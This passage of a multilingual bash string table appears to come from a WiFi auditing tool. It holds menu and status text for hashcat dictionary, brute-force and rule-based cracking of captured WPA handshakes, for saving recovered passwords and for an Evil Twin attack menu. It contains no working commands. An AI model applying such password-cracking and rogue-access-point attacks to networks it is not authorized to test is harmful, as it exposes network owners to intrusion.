	arr["CATALAN",214]="La nova versió s'ha descarregat amb èxit. El script es llençarà de nou"
	arr["PORTUGUESE",214]="A nova versão foi baixado com sucesso. O script será carregado novamente"
	arr["RUSSIAN",214]="Новая версия успешно загружена. Скрипт будет перезапущен"
	arr["GREEK",214]="Η νεότερη έκδοση κατέβηκε επιτυχώς. Το script θα επανεκκινηθεί"

	arr["ENGLISH",215]="WPA/WPA2 passwords always has 8 as a minimum length"
	arr["SPANISH",215]="Una contraseña WPA/WPA2 siempre tiene como mínimo una longitud de 8"
	arr["FRENCH",215]="Un mot de passe WPA/WPA2 a une longueur minimale de 8 caractères"
	arr["CATALAN",215]="Una contrasenya WPA/WPA2 sempre té com a mínim una longitud de 8"
	arr["PORTUGUESE",215]="Uma senha WPA/WPA2 sempre tem no mínimo 8 caracteres"
	arr["RUSSIAN",215]="WPA/WPA2 пароли всегда имеют длину минимум в 8 символов"
	arr["GREEK",215]="οι κωδικοί πρόσβασης WPA/WPA2 έχουν πάντα ελάχιστο μήκος 8"

	arr["ENGLISH",216]="No networks found with Handshake captured on the selected file"
	arr["SPANISH",216]="No se encontraron redes con Handshake capturado en el fichero seleccionado"
	arr["FRENCH",216]="Aucun réseau avec son Handshake n'a été trouvé dans le fichier sélectionné"
	arr["CATALAN",216]="No s'han trobat xarxes amb Handshake capturat en el fitxer seleccionat"
	arr["PORTUGUESE",216]="Nenhuma rede encontrada no arquivo Handshake capturado no arquivo selecionado"
	arr["RUSSIAN",216]="В выбранном файле сети с захваченным рукопожатием не найдены"
	arr["GREEK",216]="Δεν βρέθηκαν δίκτυα με Χειραψία στο επιλεγμένο αρχείο"

	arr["ENGLISH",217]="Only one valid target detected on file. BSSID autoselected [${normal_color}${bssid}${blue_color}]"
	arr["SPANISH",217]="Sólo un objetivo válido detectado en el fichero. Se ha seleccionado automáticamente el BSSID [${normal_color}${bssid}${blue_color}]"
	arr["FRENCH",217]="Le seul réseau valide présent dans le fichier choisi a été sélectionné automatiquement, son BSSID est [${normal_color}${bssid}${blue_color}]"
	arr["CATALAN",217]="Només un objectiu vàlid detectat en el fitxer. S'ha seleccionat automàticament el BSSID [${normal_color}${bssid}${blue_color}]"
	arr["PORTUGUESE",217]="Apenas um alvo válido detectado no arquivo. BSSID selecionado automaticamente [${normal_color}${bssid}${blue_color}]"
	arr["RUSSIAN",217]="В файле обнаружена только одна подходящая цель. BSSID выбрана автоматически [${normal_color}${bssid}${blue_color}]"
	arr["GREEK",217]="Μόνο ένας έγκυρος στόχος εντοπίστηκε στο αρχείο. Επιλέχθηκε αυτόματα το BSSID [${normal_color}${bssid}${blue_color}]"

	arr["ENGLISH",218]="Optional tools: checking..."
	arr["SPANISH",218]="Herramientas opcionales: comprobando..."
	arr["FRENCH",218]="Vérification de la présence des outils optionnels..."
	arr["CATALAN",218]="Eines opcionals: comprovant..."
	arr["PORTUGUESE",218]="Verificando se as ferramentas opcionais estão presentes..."
	arr["RUSSIAN",218]="Опциональные инструменты: проверка..."
	arr["GREEK",218]="Προαιρετικά εργαλεία: γίνεται έλεγχος..."

	arr["ENGLISH",219]="Your distro has the essential tools but it hasn't some optional. The script can continue but you can't use some features. It is recommended to install missing tools"
	arr["SPANISH",219]="Tu distro tiene las herramientas esenciales pero le faltan algunas opcionales. El script puede continuar pero no podrás utilizar algunas funcionalidades. Es recomendable instalar las herramientas que faltan"
	arr["FRENCH",219]="Votre système contient les outils fondamentaux nécessaires à l’exécution du script mais il manque quelques outils pour pouvoir utiliser pleinement toutes les fonctionnalités proposées par le script. Le script va pouvoir être exécuté mais il est conseillé d'installer les outils manquants."
	arr["CATALAN",219]="La teva distro té les eines essencials però li falten algunes opcionals. El script pot continuar però no podràs utilitzar algunes funcionalitats. És recomanable instal·lar les eines que faltin"
	arr["PORTUGUESE",219]="Sua distro tem as ferramentas essenciais, mas carece de algumas opcionais. O script pode continuar, mas você não pode usar alguns recursos. É aconselhável instalar as ferramentas ausentes"
	arr["RUSSIAN",219]="Ваш дистрибутив имеет базовые инструмент, но не имеет некоторые опциональные. Скрипт может продолжить работу, но вы не сможете использовать некоторые функции. Рекомендуется установить отсутствующие инструменты"
	arr["GREEK",219]="Η διανομή σας έχει τα απαραίτητα εργαλεία αλλά δεν έχει κάποια προαιρετικά. Το script μπορεί να συνεχίσει αλλά δεν θα μπορέσετε να χρησιμοποιήσετε κάποια χαρακτηριστικά. Συνιστάται να εγκαταστήσετε τα λείποντα εργαλεία"

	arr["ENGLISH",220]="Locked menu option was chosen"
	arr["SPANISH",220]="Opción del menú bloqueada"
	arr["FRENCH",220]="Cette option du menu est bloquée"
	arr["CATALAN",220]="Opció del menú bloquejada"
	arr["PORTUGUESE",220]="Menu bloqueado"
	arr["RUSSIAN",220]="Была выбрана заблокированная опция меню"
	arr["GREEK",220]="Επιλέχθηκε κλειδωμένη επιλογή"

	arr["ENGLISH",221]="Accepted bash version (${BASH_VERSION}). Minimum required version: ${minimum_bash_version_required}"
	arr["SPANISH",221]="Versión de bash (${BASH_VERSION}) aceptada. Mínimo requerido versión: ${minimum_bash_version_required}"
	arr["FRENCH",221]="Votre version de bash (${BASH_VERSION}) est acceptée. Version minimale requise: ${minimum_bash_version_required}"
	arr["CATALAN",221]="Versió de bash (${BASH_VERSION}) acceptada. Versió minima requerida: ${minimum_bash_version_required}"
	arr["PORTUGUESE",221]="Versão Bash (${BASH_VERSION}) aceita. Versão mínima exigida: ${minimum_bash_version_required}"
	arr["RUSSIAN",221]="Используемая версия bash (${BASH_VERSION}). Минимальная требуемая версия: ${minimum_bash_version_required}"
	arr["GREEK",221]="Αποδεκτή έκδοση bash (${BASH_VERSION}). Ελάχιστη απαιτούμενη έκδοση: ${minimum_bash_version_required}"

	arr["ENGLISH",222]="Insufficient bash version (${BASH_VERSION}). Minimum required version: ${minimum_bash_version_required}"
	arr["SPANISH",222]="Versión de bash insuficiente (${BASH_VERSION}). Mínimo requerido versión: ${minimum_bash_version_required}"
	arr["FRENCH",222]="Votre version de bash (${BASH_VERSION}) n'est pas suffisante. Version minimale requise: ${minimum_bash_version_required}"
	arr["CATALAN",222]="Versió de bash insuficient (${BASH_VERSION}). Versió mínima requerida: ${minimum_bash_version_required}"
	arr["PORTUGUESE",222]="Versão Bash insuficiente (${BASH_VERSION}). Versão mínima exigida: ${minimum_bash_version_required}"
	arr["RUSSIAN",222]="Неудовлетворительная версия bash (${BASH_VERSION}). Минимальная требуемая версия: ${minimum_bash_version_required}"
	arr["GREEK",222]="Ανεπαρκής έκδοση bash (${BASH_VERSION}). Ελάχιστη απαιτούμενη έκδοση: ${minimum_bash_version_required}"

	arr["ENGLISH",223]="Maybe the essential tools check has failed because you are not root user or don't have enough privileges. Launch the script as root user or using \"sudo\""
	arr["SPANISH",223]="Es posible que el chequeo de las herramientas esenciales haya fallado porque no eres usuario root o no tienes privilegios suficientes. Lanza el script como usuario root o usando \"sudo\""
	arr["FRENCH",223]="Il est possible que la vérification des outils essentiels ait échouée parce que vous n'êtes pas logué comme root ou ne disposez pas des privilèges nécessaires. Lancez le script en tant que root ou en utilisant \"sudo\""
	arr["CATALAN",223]="És possible que la revisió de les eines essencials hagi fallat perquè no ets usuari root o no tens privilegis suficients. Llança l'script com a usuari root o utilitzeu \"sudo\""
	arr["PORTUGUESE",223]="Talvez a checagem das ferramentas essenciais tenha falhado porque você não é root ou não tem privilégios suficientes. Execute o script como root ou usando \"sudo\""
	arr["RUSSIAN",223]="Может быть, проверка на базовые инструменты потерпела неудачу из-за того, что вы не пользователь root или не имеете достаточных привилегий. Запустите скрипт как root пользователь или используйте \"sudo\""
	arr["GREEK",223]="Ίσως ο έλεγχος απαραίτητων εργαλείων απέτυχε γιατί δεν είστε root χρήστης ή δεν έχετε αρκετά δικαιώματα. Ανοίξτε το script ως root χρήστης ή χρησιμοποιήστε \"sudo\""

	arr["ENGLISH",224]="The script execution continues from exactly the same point where it was"
	arr["SPANISH",224]="El script continua su ejecución desde exactamente el mismo punto en el que estaba"
	arr["FRENCH",224]="L'exécution du script se poursuit à partir exactement le même point où il était"
	arr["CATALAN",224]="El script contínua la seva execució des d'exactament el mateix punt en el qual estava"
	arr["PORTUGUESE",224]="A execução do script continuará exatamente do mesmo ponto"
	arr["RUSSIAN",224]="Выполнение скрипта продолжиться с точно той точки, на которой он был"
	arr["GREEK",224]="Η εκτέλεση του script συνεχίζει ακριβώς από το ίδιο σημείο που ήταν"

	arr["ENGLISH",225]="The script can't check if there is a new version because you haven't installed update tools needed"
	arr["SPANISH",225]="El script no puede comprobar si hay una nueva versión porque no tienes instaladas las herramientas de actualización necesarias"
	arr["FRENCH",225]="Le script ne peut pas vérifier si une nouvelle version est disponible parce que vous n'avez pas installé les outils nécessaires de mise à jour"
	arr["CATALAN",225]="El script no pot comprovar si hi ha una nova versió perquè no tens instal·lades les eines d'actualització necessàries"
	arr["PORTUGUESE",225]="O script não pode verificar se há uma nova versão porque você não tem instalado ferramentas de atualização necessárias"
	arr["RUSSIAN",225]="Скрипт не может проверить имеется ли новая версия, поскольку у вас не установлены необходимые инструменты обновления"
	arr["GREEK",225]="Το script δεν μπορεί να ελέγξει αν υπάρχει νεότερη έκδοση γιατί δεν έχετε εγκαταστήσει τα απαραίτητα εργαλεία ενημερώσεων"

	arr["ENGLISH",226]="Update tools: checking..."
	arr["SPANISH",226]="Herramientas de actualización: comprobando..."
	arr["FRENCH",226]="Vérification de la présence des outils de mise à jour..."
	arr["CATALAN",226]="Eines d'actualització: comprovant..."
	arr["PORTUGUESE",226]="Verificando ferramentas de atualização..."
	arr["RUSSIAN",226]="Инструменты для обновления: проверка..."
	arr["GREEK",226]="Εργαλεία ενημερώσεων: γίνεται έλεγχος..."

	arr["ENGLISH",227]="Working...  "
	arr["SPANISH",227]="Trabajando...  "
	arr["FRENCH",227]="Travail...  "
	arr["CATALAN",227]="Treballant...  "
	arr["PORTUGUESE",227]="Trabalhando...  "
	arr["RUSSIAN",227]="Работаем...  "
	arr["GREEK",227]="Δουλεύει...  "

	arr["ENGLISH",228]="                             Developed by ${author}"
	arr["SPANISH",228]="                             Programado por ${author}"
	arr["FRENCH",228]="                             Programmé par ${author}"
	arr["CATALAN",228]="                             Desenvolupat per ${author}"
	arr["PORTUGUESE",228]="                             Programado por ${author}"
	arr["RUSSIAN",228]="                             Создал ${author}"
	arr["GREEK",228]="                             Προγραμματισμένο από ${author}"

	arr["ENGLISH",229]="hashcat CPU, non GPU attacks"
	arr["SPANISH",229]="ataques hashcat CPU, no GPU"
	arr["FRENCH",229]="attaques hashcat CPU, pas GPU"
	arr["CATALAN",229]="atacs hashcat CPU, no GPU"
	arr["PORTUGUESE",229]="Ataques com hashcat usando CPU, não GPU"
	arr["RUSSIAN",229]="Атаки hashcat с использованием центрального процессора, без использования видеокарты"
	arr["GREEK",229]="επιθέσεις hashcat CPU, όχι GPU"

	arr["ENGLISH",230]="3.  (hashcat) Dictionary attack against capture file"
	arr["SPANISH",230]="3.  (hashcat) Ataque de diccionario sobre fichero de captura"
	arr["FRENCH",230]="3.  (hashcat) Attaque de dictionnaire en utilisant le fichier de capture"
	arr["CATALAN",230]="3.  (hashcat) Atac de diccionari sobre fitxer de captura"
	arr["PORTUGUESE",230]="3.  (hashcat) Ataque com dicionário em um handshake"
	arr["RUSSIAN",230]="3.  (hashcat) Атака по словарю в отношению захваченного файла"
	arr["GREEK",230]="3.  (hashcat) Επίθεση με χρήση λεξικού σε αρχείο καταγραφής"

	arr["ENGLISH",231]="4.  (hashcat) Bruteforce attack against capture file"
	arr["SPANISH",231]="4.  (hashcat) Ataque de fuerza bruta sobre fichero de captura"
	arr["FRENCH",231]="4.  (hashcat) Attaque de force brute en utilisant le fichier de capture"
	arr["CATALAN",231]="4.  (hashcat) Atac de força bruta sobre fitxer de captura"
	arr["PORTUGUESE",231]="4.  (hashcat) Ataque de força bruta em um handshake"
	arr["RUSSIAN",231]="4.  (hashcat) Атака грубой силой в отношении захваченного файла"
	arr["GREEK",231]="4.  (hashcat) Επίθεση ωμής βίας σε αρχείο καταγραφής"

	arr["ENGLISH",232]="5.  (hashcat) Rule based attack against capture file"
	arr["SPANISH",232]="5.  (hashcat) Ataque basado en reglas sobre fichero de captura"
	arr["FRENCH",232]="5.  (hashcat) Attaque fondé sur des règles en utilisant le fichier de capture"
	arr["CATALAN",232]="5.  (hashcat) Atac basat en regles sobre el fitxer de captura"
	arr["PORTUGUESE",232]="5.  (hashcat) Ataque baseado em regras em um arquivo handshake"
	arr["RUSSIAN",232]="5.  (hashcat) Атака на основе правила в отношении захваченного файла"
	arr["GREEK",232]="5.  (hashcat) Επίθεση κανόνων σε αρχείο καταγραφής"

	arr["ENGLISH",233]="Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${hashcat_potpath}]"
	arr["SPANISH",233]="Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${hashcat_potpath}]"
	arr["FRENCH",233]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur [Entrée] pour utiliser le chemin proposé ${normal_color}[${hashcat_potpath}]"
	arr["CATALAN",233]="Escriu la ruta on guardarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${hashcat_potpath}]"
	arr["PORTUGUESE",233]="Digite o caminho onde armazenar o arquivo ou pressione [Enter] para aceitar o padrão ${normal_color}[${hashcat_potpath}]"
	arr["RUSSIAN",233]="Напечатайте путь к сохранённому файлу или нажмите [Enter] для принятия предложения по умолчоанию ${normal_color}[${hashcat_potpath}]"
	arr["GREEK",233]="Πληκτρολογήστε το μονοπάτι για την αποθήκευση του αρχείου ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${hashcat_potpath}]"

	arr["ENGLISH",234]="Contratulations!! It seems the key has been decrypted"
	arr["SPANISH",234]="Enhorabuena!! Parece que la clave ha sido desencriptada"
	arr["FRENCH",234]="Félicitations!! Il semble que la clef a été décryptée"
	arr["CATALAN",234]="Enhorabona!! Sembla que la clau ha estat desencriptada"
	arr["PORTUGUESE",234]="Parabéns!! Parece que a senha foi  descriptografada"
	arr["RUSSIAN",234]="Поздравления!! Похоже на то, что ключ был расшифрован"
	arr["GREEK",234]="Συγχαρητήρια!! Φαίνεται πως το κλειδί αποκρυπτογραφήθηκε"

	arr["ENGLISH",235]="Do you want to save the trophy file with the decrypted password? ${normal_color}[y/n]"
	arr["SPANISH",235]="¿Quieres guardar el fichero de trofeo con la clave desencriptada? ${normal_color}[y/n]"
	arr["FRENCH",235]="Voulez-vous enregistrer le fichier trophée avec le mot de passe déchiffré? ${normal_color}[y/n]"
	arr["CATALAN",235]="¿Vols desar el fitxer de trofeu amb la clau desencriptada? ${normal_color}[y/n]"
	arr["PORTUGUESE",235]="Você quer salvar arquivo com a senha descriptografado? ${normal_color}[y/n]"
	arr["RUSSIAN",235]="Вы хотите сохранить трофейный файл с расшифрованным паролем? ${normal_color}[y/n]"
	arr["GREEK",235]="Θέλετε να αποθηκεύσετε το αρχείο τρόπαιο με τον αποκρυπτογραφημένο κωδικό πρόσβασης; ${normal_color}[y/n]"

	arr["ENGLISH",236]="Hashcat trophy file generated successfully at [${normal_color}${potenteredpath}${blue_color}]"
	arr["SPANISH",236]="Fichero de trofeo hashcat generado con éxito en [${normal_color}${potenteredpath}${blue_color}]"
	arr["FRENCH",236]="Le fichier trophée hashcat a bien été crée dans [${normal_color}${potenteredpath}${blue_color}]"
	arr["CATALAN",236]="Fitxer de trofeu hashcat generat amb èxit a [${normal_color}${potenteredpath}${blue_color}]"
	arr["PORTUGUESE",236]="Arquivo troféu hashcat gerado com sucesso [${normal_color}${potenteredpath}${blue_color}]"
	arr["RUSSIAN",236]="Трофейный файл hashcat был успешно сгенерирован в [${normal_color}${potenteredpath}${blue_color}]"
	arr["GREEK",236]="Το hashcat αρχείο τρόπαιο δημιουργήθηκε επιτυχώς [${normal_color}${potenteredpath}${blue_color}]"

	arr["ENGLISH",237]="5.  Lowercase + uppercase + numeric + symbol chars"
	arr["SPANISH",237]="5.  Caracteres en minúsculas + mayúsculas + numéricos + símbolos"
	arr["FRENCH",237]="5.  Lettres minuscules et majuscules + chiffres + symboles"
	arr["CATALAN",237]="5.  Caràcters en minúscules + majúscules + numèrics + símbols"
	arr["PORTUGUESE",237]="5.  Caracteres em minúsculos + maiúsculas + numeros + símbolos"
	arr["RUSSIAN",237]="5.  Буквы нижнего регистра + плюс верхнего регистра + цифры + символы"
	arr["GREEK",237]="5.  Πεζά + κεφαλαία + αριθμοί + σύμβολα"

	arr["ENGLISH",238]="Charset selection menu"
	arr["SPANISH",238]="Menú de selección de juego de caracteres"
	arr["FRENCH",238]="Menu de sélection du jeu de caractères"
	arr["CATALAN",238]="Menú de selecció de joc de caràcters"
	arr["PORTUGUESE",238]="Menu de seleção do conjunto de caracteres"
	arr["RUSSIAN",238]="Меню выбора набора символов"
	arr["GREEK",238]="Μενού επιλογής συμβολοσειράς"

	arr["ENGLISH",239]="You already have selected a rules file during this session [${normal_color}${RULES}${blue_color}]"
	arr["SPANISH",239]="Ya tienes seleccionado un fichero de reglas en esta sesión [${normal_color}${RULES}${blue_color}]"
	arr["FRENCH",239]="Vous avez déjà sélectionné un fichier règles pour cette session ${normal_color}${RULES}${blue_color}]"
	arr["CATALAN",239]="Ja tens seleccionat un fitxer de regles en aquesta sessió [${normal_color}${RULES}${blue_color}]"
	arr["PORTUGUESE",239]="Você selecionou um arquivo de regras nesta sessão [${normal_color}${RULES}${blue_color}]"
	arr["RUSSIAN",239]="Во время этой сессии вы уже выбрали файл с правилами [${normal_color}${RULES}${blue_color}]"
	arr["GREEK",239]="Έχετε ήδη επιλέξει αρχείο κανόνων κατά τη διάρκεια τησ συνεδρίας [${normal_color}${RULES}${blue_color}]"

	arr["ENGLISH",240]="Do you want to use this already selected rules file? ${normal_color}[y/n]"
	arr["SPANISH",240]="¿Quieres utilizar este fichero de reglas ya seleccionado? ${normal_color}[y/n]"
	arr["FRENCH",240]="Souhaitez vous utiliser les règles déjà sélectionné? ${normal_color}[y/n]"
	arr["CATALAN",240]="¿Vols fer servir aquest fitxer de regles ja seleccionat? ${normal_color}[y/n]"
	arr["PORTUGUESE",240]="Você quer usar esse arquivo regras já selecionados? ${normal_color}[y/n]"
	arr["RUSSIAN",240]="Вы хотите использовать этот уже выбранный файл правил? ${normal_color}[y/n]"
	arr["GREEK",240]="Θέλετε να χρησιμοποιήσετε το ήδη επιλεγμένο αρχείο κανόνων; ${normal_color}[y/n]"

	arr["ENGLISH",241]="The path to the rules file is valid. Script can continue..."
	arr["SPANISH",241]="La ruta al fichero de reglas es válida. El script puede continuar..."
	arr["FRENCH",241]="Le chemin vers le fichier règles est valide. Le script peut continuer..."
	arr["CATALAN",241]="La ruta cap al fitxer de regles és vàlida. El script pot continuar..."
	arr["PORTUGUESE",241]="O caminho para o arquivo de regras é válido. O script pode continuar..."
	arr["RUSSIAN",241]="Путь до файла с правилами верный. Скрипт может продолжать..."
	arr["GREEK",241]="Το μονοπάτι για το αρχείο κανόνων είναι έγκυρο. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",242]="Enter the path of a rules file :"
	arr["SPANISH",242]="Introduce la ruta de un fichero de reglas :"
	arr["FRENCH",242]="Saisissez un chemin vers un fichier règles d'attaque :"
	arr["CATALAN",242]="Introdueix la ruta d'un fitxer de regles :"
	arr["PORTUGUESE",242]="Digite o caminho para um arquivo de regras :"
	arr["RUSSIAN",242]="Введите путь файла с правилами :"
	arr["GREEK",242]="Εισάγετε το μονοπάτι για ένα αρχείο κανόνων :"

	arr["ENGLISH",243]="Selected rules file: ${pink_color}${RULES}${normal_color}"
	arr["SPANISH",243]="Fichero de reglas seleccionado: ${pink_color}${RULES}${normal_color}"
	arr["FRENCH",243]="Fichier règles sélectionné: ${pink_color}${RULES}${normal_color}"
	arr["CATALAN",243]="Fitxer de regles seleccionat: ${pink_color}${RULES}${normal_color}"
	arr["PORTUGUESE",243]="Arquivo regras selecionadas: ${pink_color}${RULES}${normal_color}"
	arr["RUSSIAN",243]="Выбранный файл правил: ${pink_color}${RULES}${normal_color}"
	arr["GREEK",243]="Επιλεγμένο αρχείο κανόνων: ${pink_color}${RULES}${normal_color}"

	arr["ENGLISH",244]="Rule based attacks change the words of the dictionary list according to the rules written in the rules file itself. They are very useful. Some distros has predefined rule files (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["SPANISH",244]="Los ataques basados en reglas modifican las palabras de la lista del diccionario según las reglas escritas en el propio fichero de reglas. Son muy útiles. Algunas distros ya traen ficheros predefinidos de reglas (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["FRENCH",244]="Les attaques basées sur des règles modifient les mots du dictionnaire selon les règles établies dans le fichier règles. Ils sont très utiles. Certaines distros comportent des fichiers de règles prédéfinies (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["CATALAN",244]="Els atacs basats en regles modifiquen les paraules de la llista del diccionari segons les regles escrites en el propi fitxer de regles. Són molt útils. Algunes distros ja porten fitxers de regles predefinits (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["PORTUGUESE",244]="Ataques baseados em regras mudaram as palavras de um dicionário de acordo com as regras escritas. Eles são muito úteis. Algumas distros já possuem regras predefinidas em (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["RUSSIAN",244]="Атака, основанная на правилах, изменяет слова из словаря в соответствии с правилами, написанными в самом файле правил. Они очень полезны. Некоторые дистрибутивы имеют предустановленные правила (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["GREEK",244]="Οι επιθέσεις κανόνων αλλάζουν τις λέξεις του λεξικού ανάλογα με τους κανόνες που έχουν γραφτεί στο αρχείο κανόνων. Είναι πολύ χρήσιμοι. Κάποιες διανομές έχουν προκαθορισμένα αρχεία κανόνων (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"

	arr["ENGLISH",245]="// ${yellow_color}Chipset:${normal_color} ${unknown_chipsetvar}"
	arr["SPANISH",245]="// ${yellow_color}Chipset:${normal_color} ${unknown_chipsetvar}"
	arr["FRENCH",245]="// ${yellow_color}Chipset:${normal_color} ${unknown_chipsetvar}"
	arr["CATALAN",245]="// ${yellow_color}Chipset:${normal_color} ${unknown_chipsetvar}"
	arr["PORTUGUESE",245]="// ${yellow_color}Chipset:${normal_color} ${unknown_chipsetvar}"
	arr["RUSSIAN",245]="// ${yellow_color}Chipset:${normal_color} ${unknown_chipsetvar}"
	arr["GREEK",245]="// ${yellow_color}Chipset:${normal_color} ${unknown_chipsetvar}"

	arr["ENGLISH",246]="Every time you see a text with the prefix ${cyan_color}${pending_of_translation}${pink_color} acronym for \"Pending of Translation\", means the translation has been automatically generated and is still pending of review"
	arr["SPANISH",246]="Cada vez que veas un texto con el prefijo ${cyan_color}${pending_of_translation}${pink_color} acrónimo de \"Pending of Translation\", significa que su traducción ha sido generada automáticamente y que aún está pendiente de revisión"
	arr["FRENCH",246]="Chaque fois que vous voyez un texte précédé par ${cyan_color}${pending_of_translation}${pink_color} acronyme de \"Pending of Translation\" cela signifie que la traduction a été faite automatiquement et est en attente de correction"
	arr["CATALAN",246]="Cada vegada que vegis un text amb el prefix ${cyan_color}${pending_of_translation}${pink_color} acrònim de \"Pending of Translation\", vol dir que la traducció ha estat generada automàticament i encara està pendent de revisió"
	arr["PORTUGUESE",246]="Cada vez que você vê um texto com o prefixo ${cyan_color}${pending_of_translation}${pink_color} acrônimo para \"Pending of Translation\" significa que a tradução foi gerado automaticamente e ainda está pendente de revisão"
	arr["RUSSIAN",246]="Каждый раз, когда вы видите текст с префиксом ${cyan_color}${pending_of_translation}${pink_color} (акроним для \"Ожидает перевода\"), это означает, что перевод был сгенерирован автоматически и ещё ожидает проверки"
	arr["GREEK",246]="Κάθε φορά που θα βλέπετε κείμενο με πρόθεμα ${cyan_color}${pending_of_translation}${pink_color} ακρωνύμιο για \"Pending of Translation\", σημαίνει πως η μετάφραση δημιουργήθηκε αυτόματα και αναμένεται κριτική"

	arr["ENGLISH",247]="Despite having all essential tools installed, your system uses airmon-zc instead of airmon-ng. In order to work properly you need to install ethtool and you don't have it right now. Please, install it and launch the script again"
	arr["SPANISH",247]="A pesar de tener todas las herramientas esenciales instaladas, tu sistema usa airmon-zc en lugar de airmon-ng. Para poder funcionar necesitas tener instalado ethtool y tú no lo tienes en este momento. Por favor, instálalo y vuelve a lanzar el script"
	arr["FRENCH",247]="En dépit d'avoir tous les outils essentiels installés votre système utilise airmon-zc au lieu de airmon-ng. Vous devez installer ethtool que vous n'avez pas à ce moment. S'il vous plaît, installez-le et relancez le script"
	arr["CATALAN",247]="Tot i tenir totes les eines essencials instal·lades, el teu sistema fa servir airmon-zc en lloc del airmon-ng. Per poder funcionar necessites tenir instal·lat ethtool i tu no el tens en aquest moment. Si us plau, instal·la-ho i torna a executar el script"
	arr["PORTUGUESE",247]="Apesar de ter todas as ferramentas essenciais instalado, o sistema utiliza airmon-zc vez de airmon-ng. Para funcionar você precisa instalar ethtool e você não tem neste momento. Por favor, instale e execute o script novamente"
	arr["RUSSIAN",247]="Не смотря на то, что все базовые инструменты установлены, система использует airmon-zc вместо airmon-ng. Чтобы работать должным образом, должен быть установлен пакет ethtool, а в данный момент он отсутствует. Пожалуйста, установите его и запустите скрипт снова"
	arr["GREEK",247]="Παρά του ότι είναι εγκατεστημένα όλα τα απραίτητα εργαλεία, το σύστημά σας χρησιμοποιεί το airmon-zc αντί το airmon-ng. Για να λειτουργήσει σωστά πρέπει να εγκαταστήσετε το ethtool το οποίο δεν το έχετε αυτή τη στιγμή. Παρακαλώ, εγκαταστήστε το και ξανανοίξτε το script"

	arr["ENGLISH",248]="Language changed to Portuguese"
	arr["SPANISH",248]="Idioma cambiado a Portugués"
	arr["FRENCH",248]="Le script sera maintenant en Portugais"
	arr["CATALAN",248]="Idioma canviat a Portuguès"
	arr["PORTUGUESE",248]="Idioma alterado para Português"
	arr["RUSSIAN",248]="Язык изменён на португальский"
	arr["GREEK",248]="Η γλώσσα άλλαξε σε Πορτογαλικά"

	arr["ENGLISH",249]="5.  Portuguese"
	arr["SPANISH",249]="5.  Portugués"
	arr["FRENCH",249]="5.  Portugais"
	arr["CATALAN",249]="5.  Portuguès"
	arr["PORTUGUESE",249]="5.  Português"
	arr["RUSSIAN",249]="5.  Португальский"
	arr["GREEK",249]="5.  Πορτογαλικά"

	arr["ENGLISH",250]="If you see any bad translation or just want ${cyan_color}${pending_of_translation}${pink_color} marks to dissapear, write me to ${mail} to collaborate with translations"
	arr["SPANISH",250]="Si ves alguna traducción incorrecta o quieres que desparezcan las marcas ${cyan_color}${pending_of_translation}${pink_color}, escríbeme a ${mail} para colaborar con las traducciones"
	arr["FRENCH",250]="Si vous voyez des erreurs contresens ou voulez voir les marques ${cyan_color}${pending_of_translation}${pink_color} disparaitre, écrivez à ${mail} pour collaborer avec les traductions"
	arr["CATALAN",250]="Si veus alguna traducció incorrecta o vols que desapareguin les marques ${cyan_color}${pending_of_translation}${pink_color}, escriu-me a ${mail} per col·laborar amb les traduccions"
	arr["PORTUGUESE",250]="Se você ver qualquer erro de tradução ou quer que as marcas ${cyan_color}${pending_of_translation}${pink_color} sejam retiradas, escreva para ${mail} para colaborar com as traduções"
	arr["RUSSIAN",250]="Если вы видите плохой перевод или просто хотите снять пометку ${cyan_color}${pending_of_translation}${pink_color} напишите мне на ${mail} для сотрудничества с переводчиками"
	arr["GREEK",250]="Αν δείτε κάποια κακή μετάφραση ή απλά θέλετε τα σημάδια ${cyan_color}${pending_of_translation}${pink_color} να εξαφανιστούν, στείλτε μου στο ${mail} για να συνεργαστούμε με τις μεταφράσεις"

	arr["ENGLISH",251]="You have chosen the same language that was selected. No changes will be done"
	arr["SPANISH",251]="Has elegido el mismo idioma que estaba seleccionado. No se realizarán cambios"
	arr["FRENCH",251]="Vous venez de choisir la langue qui est en usage. Pas de changements"
	arr["CATALAN",251]="Has triat el mateix idioma que estava seleccionat. No es realitzaran canvis"
	arr["PORTUGUESE",251]="Você escolheu o mesmo idioma que estava selecionado. Nenhuma alteração será feita"
	arr["RUSSIAN",251]="Вы выбрали такой же язык, какой и был. Никаких изменений не будет сделано"
	arr["GREEK",251]="Επιλέξατε την ίδια γλώσσα που ήταν ήδη επιλεγμένη. Δεν θα γίνει καμία αλλαγή"

	arr["ENGLISH",252]="7.  Evil Twin attacks menu"
	arr["SPANISH",252]="7.  Menú de ataques Evil Twin"
	arr["FRENCH",252]="7.  Menu des attaques Evil Twin"
	arr["CATALAN",252]="7.  Menú d'atacs Evil Twin"
	arr["PORTUGUESE",252]="7.  Menu de ataques Evil Twin"
	arr["RUSSIAN",252]="7.  Меню атак Злой Двойник"
	arr["GREEK",252]="7.  Μενού επιθέσεων Evil Twin"

	arr["ENGLISH",253]="Evil Twin attacks menu"
	arr["SPANISH",253]="Menú de ataques Evil Twin"
	arr["FRENCH",253]="Menu des attaques Evil Twin"
	arr["CATALAN",253]="Menú d'atacs Evil Twin"
	arr["PORTUGUESE",253]="Menu de ataques Evil Twin"
	arr["RUSSIAN",253]="Меню атак Злой Двойник"
	arr["GREEK",253]="Μενού επιθέσεων Evil Twin"

	arr["ENGLISH",254]="In order to use the Evil Twin just AP and sniffing attacks, you must have another one interface in addition to the wifi network interface will become the AP, which will provide internet access to other clients on the network. This doesn't need to be wifi, can be ethernet"
